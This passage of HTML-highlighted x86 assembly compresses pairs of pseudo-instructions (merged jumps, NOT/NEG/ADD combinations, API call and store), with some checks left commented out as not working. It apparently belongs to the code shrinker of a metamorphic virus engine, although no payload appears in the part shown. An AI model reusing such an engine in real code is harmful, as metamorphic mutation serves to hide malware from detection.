                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">    </span><span class="sc1">; Jcc + JMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next14_CheckJMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Double_Next15</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">     </span><span class="sc1">; Jcc + Jcc?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next15</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if they point to the next</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; label</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next15</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc1">; EAX = Flag test 1</span><span class="sc0">
                </span><span class="sc1">; EBX = Flag test 2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRealCheck</span><span class="sc0"> </span><span class="sc1">; Merge the flag checking</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">     </span><span class="sc1">; Add 70 to the result</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">    </span><span class="sc1">; If Jcc + Jcc == JMP, set it, and jump</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next32_JMP</span><span class="sc0"> </span><span class="sc1">; to eliminate the code until the</span><span class="sc0">
                                          </span><span class="sc1">; next label</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
      </span><span class="sc5">@@Double_Next14_CheckJMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Jcc @123 + JMP @123 = JMP @123</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next_SetNOPAt1st</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">

      </span><span class="sc5">@@Double_Next15</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                 mov     edx, 40h</span><span class="sc0">
</span><span class="sc1">;                 call    Check_OP_MOV</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 0FFh               ; This makes many problems!</span><span class="sc0">
</span><span class="sc1">;                 jz    @@Double_Next_SetNOPAt1st ;</span><span class="sc0">
                                                  </span><span class="sc1">; Disabled.</span><span class="sc0">
      </span><span class="sc5">@@Double_Next16</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                 mov     edx, 0C0h</span><span class="sc0">
</span><span class="sc1">;                 call    Check_OP_MOV</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 0FFh</span><span class="sc0">
</span><span class="sc1">;                 jz    @@Double_Next_SetNOPAt1st</span><span class="sc0">

      </span><span class="sc5">@@Double_Next17</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">    </span><span class="sc1">; NOT Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next18</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc0">    </span><span class="sc1">; NOT Reg + NEG Reg?</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Set ADD Reg,1</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_Check_NOT_OP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; 0E4h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next17_ADDReg</span><span class="sc0"> </span><span class="sc1">; Check NOT/NEG + ADD,1/-1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; 00h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
        </span><span class="sc5">@@Double_Next17_NEGReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
        </span><span class="sc5">@@Double_Next17_NEGReg_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next17_Get32</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Double_Next17_Cont00</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next17_Cont00</span><span class="sc0">
        </span><span class="sc5">@@Double_Next17_Get32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@@Double_Next17_Cont00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; NEG</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next17_ADDReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
        </span><span class="sc5">@@Double_Next17_ADDReg_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Double_Next18</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [esi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">  </span><span class="sc1">; Check NOT Reg8 + NEG Reg8/ADD Reg8,1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next19</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; If so, set ADD Reg8,1/NEG Reg8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_Check_NOT_OP</span><span class="sc0">

      </span><span class="sc5">@@Double_Next19</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [esi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc0">  </span><span class="sc1">; NEG Reg + NOT Reg/ADD Reg,-1?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next20</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; If so, set ADD Reg,-1/NOT Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_Check_NOT_OP</span><span class="sc0">

      </span><span class="sc5">@@Double_Next20</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [esi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc0">  </span><span class="sc1">; NEG Reg8 + NOT Reg8/ADD Reg8,-1?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Set ADD Reg8,-1/NOT Reg8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_Check_NOT_OP</span><span class="sc0">

      </span><span class="sc5">@@Double_Next21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1h</span><span class="sc0">  </span><span class="sc1">; NOT Mem + NEG Mem/ADD Mem,1?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next22</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E5h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; Then, set ADD Mem,1/NEG Mem</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_Check_NOT_OP_Mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next21_ADDMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
        </span><span class="sc5">@@Double_Next21_NEGMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if operands are the same</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next17_NEGReg_2</span><span class="sc0">
        </span><span class="sc5">@@Double_Next21_ADDMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Check NOT/NEG + ADD,1/-1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next17_ADDReg_2</span><span class="sc0">

      </span><span class="sc5">@@Double_Next22</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc0">     </span><span class="sc1">; NOT Mem8 + NEG Mem8/ADD Mem,1?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next23</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E7h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set ADD Mem8,1/NEG Mem8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_Check_NOT_OP_Mem</span><span class="sc0">

      </span><span class="sc5">@@Double_Next23</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E5h</span><span class="sc0">     </span><span class="sc1">; NEG Mem + NOT Mem/ADD Mem,-1?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next24</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Set ADD Mem,-1/NOT Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_Check_NOT_OP_Mem</span><span class="sc0">

      </span><span class="sc5">@@Double_Next24</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E7h</span><span class="sc0">     </span><span class="sc1">; NEG Mem8 + NOT Mem8/ADD Mem8,-1?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next25</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Set ADD Mem8,-1/NOT Mem8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_Check_NOT_OP_Mem</span><span class="sc0">


</span><span class="sc1">; Next four conditions are also disabled. They would work theorically, but they</span><span class="sc0">
</span><span class="sc1">; don't in practice :/</span><span class="sc0">
      </span><span class="sc5">@@Double_Next25</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 38h</span><span class="sc0">
</span><span class="sc1">;                 jb    @@Double_Next26</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 3Ch</span><span class="sc0">
</span><span class="sc1">;                 ja    @@Double_Next26</span><span class="sc0">
</span><span class="sc1">;         @@Double_Next_CheckComparision:</span><span class="sc0">
</span><span class="sc1">;                 mov     al, [edi]</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 70h</span><span class="sc0">
</span><span class="sc1">;                 jb    @@Double_Next_NoComparision</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 7Fh</span><span class="sc0">
</span><span class="sc1">;                 jbe   @@Double_End</span><span class="sc0">
</span><span class="sc1">;       @@Double_Next_NoComparision:</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@Double_Next_SetNOPAt1st</span><span class="sc0">

      </span><span class="sc5">@@Double_Next26</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                 ;mov     al, [esi]</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 38h+80h</span><span class="sc0">
</span><span class="sc1">;                 jb    @@Double_Next27</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 3Ch+80h</span><span class="sc0">
</span><span class="sc1">;                 jbe   @@Double_Next_CheckComparision</span><span class="sc0">

      </span><span class="sc5">@@Double_Next27</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                 ;mov     al, [esi]</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 48h</span><span class="sc0">
</span><span class="sc1">;                 jb    @@Double_Next28</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 4Ch</span><span class="sc0">
</span><span class="sc1">;                 jbe   @@Double_Next_CheckComparision</span><span class="sc0">

      </span><span class="sc5">@@Double_Next28</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                 ;mov     al, [esi]</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 48h+80h</span><span class="sc0">
</span><span class="sc1">;                 jb    @@Double_Next29</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 4Ch+80h</span><span class="sc0">
</span><span class="sc1">;                 jbe   @@Double_Next_CheckComparision</span><span class="sc0">

      </span><span class="sc5">@@Double_Next29</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">   </span><span class="sc1">; CALL Mem + MOV Mem,EAX?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next30</span><span class="sc0">
        </span><span class="sc5">@@Double_Next29_CheckAPICALL_STORE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check EAX</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Set APICALL_STORE</span><span class="sc0">
